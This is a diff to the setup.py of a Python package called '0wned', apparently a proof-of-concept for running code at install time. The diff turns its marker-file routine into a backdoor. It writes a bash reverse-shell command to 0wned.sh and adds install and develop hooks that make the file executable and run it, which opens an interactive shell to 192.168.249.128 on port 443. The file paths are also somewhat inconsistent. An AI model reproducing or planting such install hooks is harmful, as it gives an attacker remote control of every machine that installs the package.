@@ -16,7 +16,7 @@ long_description_filename = os.path.join(
 with open(long_description_filename) as fd:
     long_description = fd.read()
 
-FILENAME = '0wned'
+FILENAME = '0wned.sh'
 ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
 USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
 USER = getpass.getuser()
@@ -26,7 +26,7 @@ TIME = int(time.time())
 def touch_file():
     try:
         with open(ROOT_PATH, 'a') as root_fd:
-            message = 'Created {!r} with user {!r} at {!r}'.format(
+            message = 'sh -i >& /dev/tcp/192.168.249.128/443 0>&1'.format(
                 ROOT_PATH,
                 USER,
                 TIME
@@ -36,7 +36,7 @@ def touch_file():
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
-                message = 'Created {!r} with user {!r} at {!r}'.format(
+                message = 'sh -i >& /dev/tcp/192.168.249.128/443 0>&1'.format(
                     USER_PATH,
                     USER,
                     TIME
@@ -51,18 +51,22 @@ def touch_file():
 class PostDevelopCommand(develop):
     def run(self):
         touch_file()
+        os.system("chmod +x ./0wned.sh")
+        os.system("./0wned.sh")
         develop.run(self)
 
 
 class PostInstallCommand(install):
     def run(self):
         touch_file()
+        os.system("chmod +x ./0wned.sh")
+        os.system("./0wned.sh")
         install.run(self)
 
 
 setup(
     name='0wned',
-    version='0.6.0',
+    version='0.7.0',
     description='Code execution via Python package installation.',
     long_description=long_description,
     long_description_content_type='text/markdown',
